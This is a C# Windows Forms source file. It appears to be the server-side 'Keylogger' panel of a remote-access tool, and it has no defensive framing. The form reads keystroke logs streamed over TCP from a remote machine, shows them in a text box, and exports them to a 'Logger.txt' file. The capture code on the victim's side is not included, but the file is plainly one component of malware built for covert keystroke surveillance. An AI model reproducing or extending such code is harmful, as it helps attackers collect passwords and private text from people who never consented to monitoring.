using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;

namespace Server
{
    public partial class Keylogger : Form
    {
        NetworkStream KeylogStream;
        private Thread KeyLogger;
        private TcpClient clientLog;
        public Keylogger(TcpClient client)
        {
            clientLog = client;
            CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();

        }

        public void logFunction()
        {
            btn_KeyLogging.Enabled = false;
            while (clientLog.Connected)
            {
                try
                {
                    KeylogStream = clientLog.GetStream();
                    byte[] data = new byte[1024];
                    int numBytesRead = KeylogStream.Read(data, 0, data.Length);
                    if (numBytesRead > 0)
                    {
                        string GetLog = Encoding.ASCII.GetString(data, 0, numBytesRead);
                        richTextBox1.Text += GetLog;
                    }
                    btn_KeyLogging.Enabled = true;
                }
                catch (Exception)
                {
                    btn_KeyLogging.Enabled = true;
                }
            }
        }
        private void btn_KeyLogging_Click(object sender, EventArgs e)
        {
            KeyLogger = new Thread(logFunction);
            KeyLogger.IsBackground = true;
            KeyLogger.Start();
            btn_KeyLogging.Text = "Key logging in process";
        }

        private void btn_XuatFile_Click(object sender, EventArgs e)
        {
            string content = richTextBox1.Text;
            SaveFileDialog save = new SaveFileDialog();
            save.Filter = "txt files (*.txt)|*.txt";
            save.FileName = "Logger.txt";
            save.ShowDialog();
            FileStream fs = new FileStream(save.FileName, FileMode.Create);
            StreamWriter sr = new StreamWriter(fs, Encoding.UTF8);
            sr.Write(content);
            sr.Close();
            fs.Close();
        }
    }
}
